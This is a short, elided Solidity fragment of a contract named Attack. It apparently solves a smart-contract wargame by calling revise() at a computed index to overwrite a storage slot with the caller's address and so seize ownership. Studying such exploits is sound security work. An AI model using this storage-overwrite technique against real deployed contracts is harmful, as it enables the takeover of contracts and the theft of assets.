...
contract Attack {
    ...
    function attack() public {
        ...
        instance.revise(targetIndex, bytes32(uint256(uint160(msg.sender))));
    }

    function encodeSlotNum(uint256 slot) public pure returns (bytes memory) {
        return abi.encode(slot);
    }
}
